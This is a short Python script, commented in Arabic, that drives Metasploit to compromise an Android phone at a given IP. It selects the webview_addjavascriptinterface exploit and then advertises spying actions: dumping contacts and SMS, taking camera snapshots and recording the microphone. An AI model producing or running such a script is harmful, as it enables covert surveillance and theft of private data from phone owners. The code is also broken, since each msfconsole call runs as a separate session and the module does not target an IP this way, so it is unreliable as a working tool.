import subprocess

def exploit_android(ip):
    try:
        # استخدام Metasploit للبحث عن الثغرات في الجهاز
        subprocess.run(["msfconsole", "-q", "-x", f'search android'])
        subprocess.run(["msfconsole", "-q", "-x", f'search exploit'])
        subprocess.run(["msfconsole", "-q", "-x", f'search payload'])
        subprocess.run(["msfconsole", "-q", "-x", f'search post'])
        subprocess.run(["msfconsole", "-q", "-x", f'search auxiliary'])
        
        # استخدام Metasploit لاختراق الهاتف
        subprocess.run(["msfconsole", "-q", "-x", f'use exploit/android/browser/webview_addjavascriptinterface'])
        subprocess.run(["msfconsole", "-q", "-x", f'set RHOSTS {ip}'])
        subprocess.run(["msfconsole", "-q", "-x", 'exploit'])
        
        # عرض الأوامر للاستخدام بضغطة زر واحدة
        print("Commands for further exploitation:")
        print("1. dump_contacts - Dump contacts from the device")
        print("2. dump_sms - Dump SMS messages from the device")
        print("3. webcam_snap - Take a snapshot using the device's camera")
        print("4. record_mic - Record audio using the device's microphone")
    except Exception as e:
        print(f"Error: {e}")

# استخدام الدالة لاختراق الهاتف بواسطة عنوان IP
exploit_android("192.168.1.1")
